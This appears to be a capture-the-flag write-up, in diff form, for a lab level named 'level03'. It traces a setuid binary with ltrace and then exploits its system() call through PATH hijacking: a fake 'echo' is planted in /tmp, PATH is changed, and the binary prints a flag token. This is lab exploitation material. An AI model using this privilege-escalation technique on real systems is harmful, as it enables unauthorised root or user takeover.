@@ -1,0 +1,51 @@
+ltrace ./level03 
+__libc_start_main(0x80484a4, 1, 0xbffff7c4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                = 2003
+geteuid()                                                = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)      = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                   = 0
++++ exited (status 0) +++
+
+/usr/bin/env echo Exploit me
+Exploit me
+
+ls -la /
+total 2
+drwxr-xr-x  1 root root  240 Mar  5 17:42 .
+drwxr-xr-x  1 root root  240 Mar  5 17:42 ..
+drwxr-xr-x  2 root root 2814 Mar  9  2016 bin
+drwxr-xr-x  1 root root   60 Aug 30  2015 boot
+dr-xr-xr-x  7 root root 2048 Mar 12  2016 cdrom
+drwxr-xr-x 15 root root 4040 Mar  5 17:42 dev
+drwxr-xr-x  1 root root  260 Mar  5 17:42 etc
+d--x--x--x  1 root root   80 Aug 30  2015 home
+lrwxrwxrwx  1 root root   37 Aug 29  2015 initrd.img -> /boot/initrd.img-3.2.0-89-generic-pae
+drwxr-xr-x 23 root root 1436 Aug 30  2015 lib
+drwxr-xr-x  1 root root   60 Mar 12  2016 media
+drwxr-xr-x  2 root root    3 Mar 12  2016 mnt
+drwxr-xr-x  1 root root   60 Mar  5 17:42 opt
+dr-xr-xr-x 95 root root    0 Mar  5 17:42 proc
+drwxrwxrwx 21 root root  364 Mar 12  2016 rofs
+drwx------  5 root root  165 Mar 12  2016 root
+drwxr-xr-x 14 root root  540 Mar  5 18:06 run
+drwxr-xr-x  2 root root 3469 Aug 30  2015 sbin
+drwxr-xr-x  2 root root    3 Mar  5  2012 selinux
+drwxr-xr-x  2 root root    3 Aug 29  2015 srv
+drwxr-xr-x 13 root root    0 Mar  5 17:42 sys
+d-wx-wx-wx  4 root root   80 Mar  5 18:24 tmp
+drwxr-xr-x  1 root root   80 Aug 29  2015 usr
+drwxr-xr-x  1 root root  160 Mar 12  2016 var
+lrwxrwxrwx  1 root root   33 Aug 29  2015 vmlinuz -> boot/vmlinuz-3.2.0-89-generic-pae
+
+echo getflag > /tmp/echo
+
+chmod 777 /tmp/echo
+
+export PATH="/tmp/:/bin"
+
+./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
